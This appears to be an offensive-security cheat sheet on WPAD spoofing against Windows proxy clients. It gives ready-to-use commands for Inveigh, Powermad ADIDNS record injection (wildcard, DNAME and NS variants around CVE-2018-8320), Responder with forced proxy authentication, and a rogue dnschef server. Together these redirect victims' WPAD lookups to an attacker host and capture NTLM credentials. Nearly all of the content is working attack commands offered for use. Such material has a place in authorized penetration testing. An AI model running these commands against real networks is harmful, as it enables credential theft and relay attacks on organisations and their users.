---
technique: WPAD Spoofing
category: mitm
targets: Windows Web Proxy Clients
protocols: HTTP, DNS, LLMNR, NBT-NS
remote_capable: false
tags: mitm wpad proxy poisoning llmnr nbtns adidns dhcpv6 ntlm-capture ntlm-relay responder inveigh
---

# WPAD Spoofing

The Web Proxy Automatic Discovery (WPAD) protocol is used by Windows clients to locate a proxy configuration script (`wpad.dat`). Attackers can intercept WPAD lookups via LLMNR/NBT-NS poisoning, ADIDNS injection, or DHCPv6 spoofing to serve a rogue `wpad.dat`, capturing or relaying the proxy authentication that follows.

## Windows

Inveigh starts a WPAD rogue proxy server by default alongside its multicast poisoners.

### Invoke-Inveigh (WPAD)

#powershell #wpad #capture

Poison LLMNR/NBT-NS/mDNS and serve a rogue WPAD proxy to capture NTLM hashes from proxy-auth clients.

```powershell title:"WPAD spoofing via multicast poisoning with Inveigh"
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```
<!-- cheat -->

### Powermad (ADIDNS wildcard - pre CVE-2018-8320)

#powershell #adidns #gqbl-bypass

Add a wildcard ADIDNS record pointing to the attacker to redirect all WPAD resolution on unpatched hosts.

```powershell title:"Bypass GQBL for WPAD via wildcard ADIDNS record"
New-ADIDNSNode -Node '*' -Data "$lhost"
```
<!-- cheat
import tun_ip
-->

### Powermad (ADIDNS DNAME - pre CVE-2018-8320)

#powershell #adidns #gqbl-bypass

Add a DNAME ADIDNS record for wpad pointing to the attacker's FQDN to redirect WPAD resolution on unpatched hosts.

```powershell title:"Bypass GQBL for WPAD via DNAME ADIDNS record"
New-ADIDNSNode -Node wpad -Type DNAME -Data "$attacker_fqdn"
```
<!-- cheat
var attacker_fqdn
-->

### Powermad (ADIDNS WPAD - post CVE-2018-8320)

#powershell #adidns #ns-record

Register an NS record for WPAD pointing to the attacker's DNS server to redirect resolution on patched hosts.

```powershell title:"WPAD GQBL bypass via NS record on patched hosts"
New-ADIDNSNode -Node wpad -Type NS -Data "$attacker_fqdn"
```
<!-- cheat
var attacker_fqdn
-->

## Linux

Responder serves a rogue WPAD configuration and forces proxy authentication to capture NTLM credentials.

### responder (WPAD + ProxyAuth)

#python #wpad #capture

Start LLMNR/NBT-NS poisoning with a rogue WPAD server that forces clients to authenticate to the proxy.

```sh title:"WPAD spoofing with forced proxy auth capture via Responder"
responder --interface "$iface" --wpad --ProxyAuth
```
<!-- cheat
var iface
-->

### dnschef (NS delegation)

#python #dns #ns-delegation

Run a rogue DNS server to answer WPAD queries delegated via an ADIDNS NS record.

```sh title:"Rogue DNS server for WPAD NS delegation with dnschef"
dnschef --fakeip "$lhost" --interface "$lhost" --port 53 --logfile dnschef.log
```
<!-- cheat
import tun_ip
-->
